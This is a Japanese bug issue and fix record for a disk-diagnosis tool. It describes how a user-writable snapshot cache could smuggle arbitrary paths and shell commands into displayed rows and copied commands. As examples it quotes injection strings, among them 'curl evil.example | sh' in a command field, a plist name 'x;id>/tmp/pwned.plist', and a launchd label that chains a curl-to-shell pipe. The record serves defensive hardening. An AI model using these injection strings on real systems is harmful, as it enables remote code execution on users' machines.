# 178 bug: snapshot を信用する境界が閉じておらず、書き換えた JSON の任意パスが行・コピー・再利用に載る (④ の前提)

起票日: 2026-09-02
重要度: **P1**
関連: [issues/163](163-audit-doctor-implementation-red-team.md) (体 5) / [issues/148](148-feat-glogx-doctor-disk-diagnosis.md) (「追記」の snapshot 再利用 / 「④ への追加要件」)

## 対象

`src/glogx/doctor_view.go` の `start` (snapshot 復元) / `doctorReuseFrom`、`src/glogx/doctor_cache.go` の
`loadDoctorSnapshot` / `loadDoctorSnapshotAny`

## なぜ P1 か

`doctor-snapshot.json` は一般ユーザー権限で書き換えられる。**今は削除機能が無いので実害は表示だけ**だが、
④ (削除) はこの画面の行を対象にする設計なので、**④ を実装する前にこの境界を確定しておかないと、
「キャッシュに書いた任意パスが削除対象になる」形が入りうる**。

## 実測 (体 5 の probe。偽 XDG_CACHE_HOME に細工した snapshot を置いた。実証済み)

### (a) TTL 内 (5 分以内) の snapshot は catalog を見ずに丸ごと表示される

- カタログに存在しない ID (`gone-id`) の Result がそのまま行になる: 「カタログから消えた ID … 4.7GB ✅ 安全」
- Items に書いた `/Users/koji/Documents` が Enter の詳細に出る。`y` を押すと
  `action=doctorCopyPath, payload=/Users/koji/Documents` が返る (= 任意パスがコピー経路に乗る)
- サービス節も snapshot 由来で出る。`⛔ evil` の `Commands` に書いた `curl evil | sh` が Enter の詳細に出る
- **snapshot 復元経路では全 Result の `Reused` が false**。「走査していない」ことを示すのは view の `snapshotAt` だけで、
  Result 側には痕跡が無い

### (b) TTL 切れ + 重いエントリの再利用でも任意パスが載る

`elapsed=10s` / `measured_at=1 分前` にした Result の Items.Path を `/Users/koji/Documents` にすると、
走査は走るがそのエントリは **`Reused=true` で Items がそのまま `Results` に載る**。
Entry (Label / risk) はカタログ側に差し替わるので**行は正規に見える**。新しい snapshot にも書き戻される。

### (c) 部分的に壊れた JSON の扱い

| ケース | load | 挙動 |
|---|---|---|
| `total` が文字列 / `results` が object / `elapsed` が文字列 / 末尾ゴミ | 失敗 | 走査に倒れる (良い) |
| 1 Result の `status` が未知の文字列 | 成功 | 行は出る (✅ 安全 + サイズ表示)。合計には入らない |
| `items` が null | 成功 | ok 扱い |
| `size` が負数 | 成功 | **「-5B 解放可能」と表示** |
| `measured_at` が 48 時間未来 | 成功 | TTL 内ならそのまま表示 (reuse 側は `age<0` で除外する) |

## 対応案

**④ の不変条件として issue 148 に書く (この issue の第一の成果物)**:

> 削除は必ず「再スキャン + `validateTarget`」を通した Result だけを対象にする。snapshot / キャッシュ由来の Path を
> 削除対象にしない。`Reused=true` の行と snapshot 復元中の行は、削除の前に必ず再スキャンする。

そのために今すぐ入れるもの:

1. snapshot 復元経路の Result に「走査していない」印を持たせる (`Reused=true` を立てるか、`FromSnapshot` を足す)。
   今は view の `snapshotAt` にしか無く、Result 単位では区別できない
2. 復元時にカタログに無い ID の Result を落とす (`doctorReuseFrom` と同じ規律に揃える)
3. 未知の `status` は「診断できず」に倒す (✅ 安全 と表示しない)
4. `size` が負数の Result を弾く
5. `measured_at` が未来の Result を復元経路でも弾く (`age<0`。reuse 側にはある = 非対称)

## 受け入れ条件

- [ ] ④ の不変条件が issue 148 に書かれている
- [ ] 1〜5 がテストで固定されている (細工した snapshot を食わせる probe テスト)
- [ ] 変異検証: 各ガードを外すと細工した値が行・コピー・合計に現れることを確認する

## 対応 (2026-09-03)

**修正した。受け入れ条件の 3 つとも満たした。**

### ④ の不変条件 (この issue の第一の成果物)

[issues/148](148-feat-glogx-doctor-disk-diagnosis.md) の「🚨 ④ (削除) の不変条件」節に書いた。
要約: 削除対象は「今回の走査で `validateTarget` を通った Result」だけ。`Reused` または
`FromSnapshot` が立っている行は削除の前に必ず再スキャンする。

### 1〜5 の実装

- **1**: `disk.Result` に **`FromSnapshot`** を新設 (`Reused` は流用しない)。
  ⚠️ 最初は `Reused` を流用したが、`Reused` は既に「重いエントリの計測値を前回から引き継いだ」
  という別の意味を持ち、行の「N 分前の計測を再利用」注記を出している。流用すると**普通の開き直しで
  全行に嘘の注記が出た** (敵対レビュー 1 周目が細工なしの通常フローで再現。`-1113 分前の計測を再利用`)
- **2**: `doctorSnapshotInCatalog` を復元経路 (`start`) に置き、実効カタログに無い ID を落とす
- **3**: 未知の `Status` を落とす (`✅ 安全 + サイズ表示` に化けていた)
- **4**: 負の `Result.Size` と負の `Item.Size` を落とす
- **5**: 未来の `MeasuredAt` を落とす (reuse 側と規律を揃えた)

### 🚨 ディスク節だけでは境界が閉じていなかった (敵対レビュー 1 周目)

issue 本文の実測が記録していた「サービス節も snapshot 由来で出る」がそのまま残っていた。
`⛔ evil` の行は**操作なしで**画面に出て、`Y` で `Commands` の `curl evil.example | sh` が
**クリップボードへそのまま渡る**。→ `src/doctor/svc/restore.go` の `svc.SanitizeRestored` を新設:

- **`Commands` は捨てて `manualCommands` で再生成する** (Label / Domain / PlistPath から導出できる)
- その材料を検査し、通らない Finding は丸ごと落とす (`Label` / `Domain` は allowlist の正規表現、
  `PlistPath` は絶対・`filepath.Clean` 済み・`.plist` 終わり・`..` を含まない)
- 表示だけの自由文は制御文字を落として長さを切る
- brew は `Warning:` で始まる塊だけを残し、制御文字を落として長さと件数を切る

### 🚨 実走査でも成立するインジェクションが 2 つ見つかった (敵対レビュー 2〜3 周目)

**snapshot とは無関係に成立する本番バグ**なので、この issue の中で直した:

1. **`shellQuote` が禁止文字を数える形で `;` `&` `|` `<` `>` `(` `)` `*` `?` `#` `!` `~` `\n` を
   数え漏らしていた**。`/Library/LaunchDaemons/x;id>/tmp/pwned.plist` という plist 名があると、
   提示コマンドが `sudo rm /Library/LaunchDaemons/x` と `id > /tmp/pwned.plist` の 2 つに割れる
   → **allowlist 判定** (`^[A-Za-z0-9_@%+=:,./-]+$`) に作り替え、`svc.ShellQuote` として公開して
   glogx の `plutil -p` / `ls -l` を出す 4 箇所すべてに通した
2. **`manualCommands` が `Label` を引用せずに `launchctl bootout <domain>/<label>` へ埋めていた**。
   `Label` は plist の `Label` キーをそのまま読んだ値で、`~/Library/LaunchAgents` に書ける
   任意のローカルプロセスが決められる。`evil; curl evil.example | sh #` というラベルで、
   **doctor 自身が提示する「手で実行してください」のコマンドがインジェクションを運ぶ**
   → `<domain>/<label>` を連結してから引用する

### 変異検証 (全 13 本 red)

カタログ filter 除去 / Status 検査除去 / `Result.Size` 検査除去 / `Item.Size` 検査除去 /
未来の `MeasuredAt` 検査除去 / `FromSnapshot` 除去 / Svc を sanitize しない / Brew を sanitize しない /
`Commands` を再生成せず保存値を使う / 材料の形の検査を外す / `Undiagnosed` の形の検査を外す /
コマンド行の `ShellQuote` を外す / `shellQuote` を旧実装へ戻す / `Label` の引用を外す /
自由文でタブを通す / ディスク自由文で改行を通す。

### 敵対的レビュー (sonnet / read-only / 3 周)

採用 8 件 / 却下 0 件。

| 周 | 指摘 | 対応 |
|---|---|---|
| 1 | **P1** Svc / Brew が完全に未サニタイズ (`curl evil \| sh` がコピー経路に乗る) | `svc.SanitizeRestored` / `sanitizeRestoredBrew` を新設 |
| 1 | **P2** `Reused` の流用で、細工なしの通常フローに嘘の注記が出る | `FromSnapshot` を新設して分離 |
| 2 | `Undiagnosed.PlistPath` が無検査で `plutil -p <path>` に引用なしで出る (Finding より悪い) | 形の検査 + `ShellQuote` の二重防御 |
| 2 | `shellQuote` の禁止文字リストが `;` 等を数え漏らす (**実走査で成立**) | allowlist 判定へ |
| 2 | `\t` を明示的に通していた (`dispWidth` は幅 0 と数えるが端末は進む) | 通さない |
| 2 | ディスク節の自由文が無検査 (`diskCopyText` は「別セッションの LLM に聞く」形を作るので prompt injection の材料) | 制御文字を落として件数・長さを切る |
| 3 | **`manualCommands` が実走査でも `Label` を引用していない** (ローカルプロセスが plist を書けば成立) | 連結してから引用 |
| 3 | ディスクの自由文で `\n` を通していた (brew 用の helper を共用したため。1 件 1 行で描くので行数が増える) | 1 行用の helper に分けた |

**壊せなかった**: allowlist の抜け (`shlex.split` で 16 種の病的な入力を往復させて確認) /
引用実装の抜け / `validFinding` の各検査の独立性 / snapshot laundering (細工したデータが
「新しく走査した結果」として書き戻される経路) / `FromSnapshot` の導入による既存表示の破壊。

⚠️ **この「壊せなかった」に、後で見つかった 2 件は含まれていない** (2026-09-03 追記)。
別のレビューが `Items[].Path` の無検査と `doctor-disk.json` の無検査を見つけ、
[issues/193](193-bug-doctor-snapshot-item-path-and-disk-cache-unvalidated.md) として起票・対応した。
**この節は「この探し方では壊せなかった」であって「壊れていない」ではない**ので、
次の監査は「178 で閉じたはず」と読まないこと。

### 受容した指摘 (直していない)

- **brew の警告本文は中身を検査していない**。`brew doctor` の自由文なので中身の正誤は判定できず、
  形 (`Warning:` 前置き・制御文字・長さ・件数) だけを固定した。brew 節にはコマンドの提示が無く
  ④ の削除対象でもないので、ここで止めた。中身まで断つなら復元をやめて毎回 `brew doctor` を
  回すことになり、TTL 内の開き直しを速くするというこの機能の目的と衝突する
